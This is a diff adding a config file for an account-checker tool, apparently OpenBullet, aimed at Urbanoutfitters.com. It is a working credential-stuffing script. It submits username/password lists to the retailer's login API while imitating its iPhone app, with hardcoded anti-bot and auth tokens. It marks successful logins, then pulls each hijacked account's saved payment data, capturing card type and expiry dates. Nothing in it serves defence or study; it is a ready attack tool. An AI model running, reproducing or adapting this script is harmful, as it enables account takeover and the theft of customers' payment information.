@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Urbanoutfitters.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-28T22:11:39.9799259+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.urbanoutfitters.com/api/token/v0/uo-de/auth" 
+  CONTENT "{\"merge\":true,\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.urbanoutfitters.com" 
+  HEADER "X-PX-AUTHORIZATION: 3" 
+  HEADER "User-Agent: UO/8.11 (iPhone; iOS 12.0.1; Scale/2.00)" 
+  HEADER "X-Urbn-Primary-Data-Center-Id: US-PA" 
+  HEADER "X-Urbn-Channel: ios" 
+  HEADER "x-urbn-app-brand: uo" 
+  HEADER "Akamai-Referrer: com.uo.StoreLocator/8.11" 
+  HEADER "x-urbn-app-version: 8.11" 
+  HEADER "X-Urbn-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ1byIsImlhdCI6MTU1NjQ4MTE1OC45NDU3MDcsImRhdGEiOiJ7XCJjYXJ0SWRcIjogXCI2MkNESVBXakdhTE5mc3dEVUtjWkMvRUZyek96QjJybFFNK1lrc05ySlpWYVZaT1BWaGQwOUNTaUZDQ3JySzFTNVUrM3JzMnJ4aGptNHBEMzBDY0lCdz09YWUyNWJiZjU1ZjA5OTUwYTkwYzViYzhjYjUzZjVlN2Q4NjQ5OWVkZGUyODllZGEwNmU1YmJkMDdiYWFlNTZmZFwiLCBcIndlYklkXCI6IFwiZGMwOGJkYWItYjYzZS00N2I1LTg2NjQtYjM4MTY1OGE0NmY2XCIsIFwiZWRnZXNjYXBlXCI6IHtcInJlZ2lvbkNvZGVcIjogXCJIRVwifSwgXCJicmFuZElkXCI6IFwidW9cIiwgXCJkYXRhQ2VudGVySWRcIjogXCJVUy1QQVwiLCBcInNpdGVJZFwiOiBcInVvLWRlXCIsIFwiYW5vbnltb3VzXCI6IHRydWUsIFwic2NvcGVcIjogW1wiR1VFU1RcIl0sIFwiY3JlYXRlZFRpbWVcIjogMTU1NjQ3NDUyNS42OTUzOTksIFwicHJvZmlsZUlkXCI6IFwibXQ3MXRCV1hRTEtUZGkvQlluUnJ6RHNmSUhpWW1mc2dMREtEcUxiT0gxUEVWVy82Q3BybUlmajR4WmZib1ducTVVKzNyczJyeGhqbTRwRDMwQ2NJQnc9PTI2MmQxNjE0NzQ1M2VmYWE1NDczYWQ2NjI2OGI3Njg0NGE4N2ZmZGEzNGNkNGZhZGY4NmE4ODdjNjE0OThmM2NcIiwgXCJ0cmFjZXJcIjogXCJJOTBOUkxBTzBZXCIsIFwiZ2VvUmVnaW9uXCI6IFwiVVMtUEFcIiwgXCJzaXRlR3JvdXBcIjogXCJ1by1ldVwifSIsImV4cCI6MTU1NjQ4MTc1OC45NDU3MDd9.IGYdCDfdjHE2oLHwGjIQmh_OEpIWRBWlxsCoY7KEb4o" 
+  HEADER "Content-Length: 76" 
+  HEADER "X-Urbn-Geo-Region: US-PA" 
+  HEADER "X-Urbn-Currency: EUR" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Urbn-Country: DE" 
+  HEADER "X-PX-ORIGINAL-TOKEN: 3:0dcf43f7369a238c02e60518e4e6795fa5b8d570f126d663b875882e6ae6626f:Eep/THXZIU/Y1aEHpPIKzZGAsIeMSoi4G+yaKiGaniv9zMmkoji7rcPBvzjs/s87k3BpNxvWuT9inGhMFK+q9w==:1000:55IV2KdMViVGO+JKBiyZvsO9IhKO8DclTq9GpVbQvU+Tw/oh1Tkn4DqBUUBaztj3ynA5LrBbN1JjDu6sFJlHDN6HQUZ/U1tWIaUEFaeFCuMUYWQsggCJyVrPPWgalHUvxZfb8vZjNvQM6ZGr8QYPN/CKzDvOtYHd5PCw40UdOac=" 
+  HEADER "Akamai-Sdk: MAPSDK/19.23.29 (ios; iPhone; 12.0.1) com.uo.StoreLocator/8.11" 
+  HEADER "Accept-Language: de-de" 
+  HEADER "X-Urbn-Language: de-DE" 
+  HEADER "Accept: */*" 
+  HEADER "Akamai-Map-Download: com.uo.StoreLocator/8.11" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "X-Urbn-Tracer: I90NRLAO0Y" 
+  HEADER "Akamai-Mobile-Connectivity: type=wifi;v=tpv1;rtt=1300;tpresult=2;websdk=19.23.29;prepositioned=true;appdata=com.uo.StoreLocator;carrier=o2-de/262,07;devicetype=3;optimization=transport" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Success OR 
+    KEY "Token" 
+
+PARSE "<SOURCE>" JSON "authToken" -> VAR "TOKEN" 
+
+#GET_PAYMENTS REQUEST GET "https://www.urbanoutfitters.com/api/profile/v0/uo-de/me/payments" 
+  CONTENT "{\"merge\":true,\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.urbanoutfitters.com" 
+  HEADER "X-PX-AUTHORIZATION: 3" 
+  HEADER "User-Agent: UO/8.11 (iPhone; iOS 12.0.1; Scale/2.00)" 
+  HEADER "X-Urbn-Primary-Data-Center-Id: US-NV" 
+  HEADER "X-Urbn-Channel: ios" 
+  HEADER "x-urbn-app-brand: uo" 
+  HEADER "Akamai-Referrer: com.uo.StoreLocator/8.11" 
+  HEADER "x-urbn-app-version: 8.11" 
+  HEADER "X-Urbn-Auth-Token: <TOKEN>" 
+  HEADER "X-Urbn-Geo-Region: US-PA" 
+  HEADER "X-Urbn-Currency: EUR" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Urbn-Country: DE" 
+  HEADER "X-PX-ORIGINAL-TOKEN: 3:0dcf43f7369a238c02e60518e4e6795fa5b8d570f126d663b875882e6ae6626f:Eep/THXZIU/Y1aEHpPIKzZGAsIeMSoi4G+yaKiGaniv9zMmkoji7rcPBvzjs/s87k3BpNxvWuT9inGhMFK+q9w==:1000:55IV2KdMViVGO+JKBiyZvsO9IhKO8DclTq9GpVbQvU+Tw/oh1Tkn4DqBUUBaztj3ynA5LrBbN1JjDu6sFJlHDN6HQUZ/U1tWIaUEFaeFCuMUYWQsggCJyVrPPWgalHUvxZfb8vZjNvQM6ZGr8QYPN/CKzDvOtYHd5PCw40UdOac=" 
+  HEADER "Accept-Language: de-de" 
+  HEADER "Akamai-Sdk: MAPSDK/19.23.29 (ios; iPhone; 12.0.1) com.uo.StoreLocator/8.11" 
+  HEADER "X-Urbn-Language: de-DE" 
+  HEADER "Accept: */*" 
+  HEADER "Akamai-Map-Download: com.uo.StoreLocator/8.11" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "X-Urbn-Tracer: I90NRLAO0Y" 
+  HEADER "Akamai-Mobile-Connectivity: type=wifi;v=tpv1;rtt=1300;tpresult=2;websdk=19.23.29;prepositioned=true;appdata=com.uo.StoreLocator;carrier=o2-de/262,07;devicetype=3;optimization=transport" 
+
+PARSE "<SOURCE>" JSON "paymentType" Recursive=TRUE -> CAP "Payment Type" 
+
+PARSE "<SOURCE>" JSON "cardType" Recursive=TRUE -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "expirationMonth" Recursive=TRUE -> CAP "Expiration Month" 
+
+PARSE "<SOURCE>" JSON "expirationYear" Recursive=TRUE -> CAP "Expiration Year" 
+
